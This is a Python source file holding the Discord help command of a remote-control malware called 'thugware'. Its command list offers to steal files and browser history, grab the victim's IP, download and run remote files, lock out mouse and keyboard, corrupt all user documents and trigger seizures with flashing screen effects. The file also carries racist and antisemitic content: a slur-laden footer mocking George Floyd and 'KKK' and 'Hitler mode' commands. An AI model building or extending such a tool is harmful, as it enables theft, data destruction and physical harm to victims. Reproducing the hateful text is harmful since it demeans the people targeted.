import discord
from discord.ext import commands

async def help_command(ctx):
    admin_commands = {
        '🔧 admin': 'Ask to run the thugware as admin',
        '🚫 nomouse (start/stop)': 'Deny the user mouse and keyboard privileges',
    }

    user_commands = {
        '🔊 bassboost': 'This forces the volume at 100',
        '🌫️ blur': 'Extreme GDI blurring',
        '📁 cd': 'Navigate through the victim\'s files',
        '🧹 clean': 'Remove the channels except the current one',
        '❌ errorspamz': 'Funny error spam',
        '📜 getbrowserhistory': 'Fetch the browser history.',
        '📂 getfiles': 'Use this to steal files',
        '🌐 ip': 'Get the IP address of the victim.',
        '😂 kkk': 'KKK memes fly everywhere',
        '🔪 kp': 'Kill process',
        '🔗 linkshare': 'Download and run a URL file on the victim\'s PC',
        '📊 lp': 'List active processes.',
        '🔥 melt': 'Screen melt effect',
        '💣 thugbomb':'thugbombs the pc',
        '🌍 openurl': 'Open a website in the browser',
        '🎵 playsound': 'Background music, just upload a file',
        '🔄 restartpc': 'Restart the PC.',
        '🔍 search': 'Web search',
        '🌀 screenswipe': 'The entire screen swipes and bends',
        '🔊 setvol': 'Change the user\'s volume',
        '📤 share': 'Upload and run a file',
        '⚡ seizure': 'Give the victim a seizure',
        '💀 hitlermode': 'Activate or deactivate Hitler mode for the victim',
        '🗣️ speak': 'Speak the given message out loud.',
        '📸 ss': 'Snip a screenshot',
        '💻 sysinfo': 'Get system information.',
        '🗃️ thugfiles': 'Rename and corrupt all files in Downloads/Documents for good',
        '📂 tree': 'Get file tree',
        '🌪️ tornado': 'Screen tornado',
        '🖼️ wallpaper': 'Change the wallpaper.',
        '❌ close': 'Close the current program.',
        'ℹ️ help': 'Show this help message.'
    }

    # Sort commands alphabetically per category
    sorted_admin_commands = sorted(admin_commands.items())
    sorted_user_commands = sorted(user_commands.items())
    
    admin_command_text = "\n".join(f"`{command}`: {description}" for command, description in sorted_admin_commands)
    user_command_text = "\n".join(f"`{command}`: {description}" for command, description in sorted_user_commands)

    # Combine the command text
    combined_command_text = (
        f"**ADMIN COMMANDS**\n{admin_command_text}\n\n"
        f"**USER COMMANDS**\n{user_command_text}"
    )

    embed = discord.Embed(
        title="Available Commands",
        description=combined_command_text,
        color=0x1F8B4C  # A greenish color
    )
    
    total_commands = len(admin_commands) + len(user_commands)
    embed.set_footer(text=f"THUGWARE\nBY GEORGE FLOYD NEGROID INDUSTRIES | Total Commands: {total_commands}")

    await ctx.send(embed=embed)
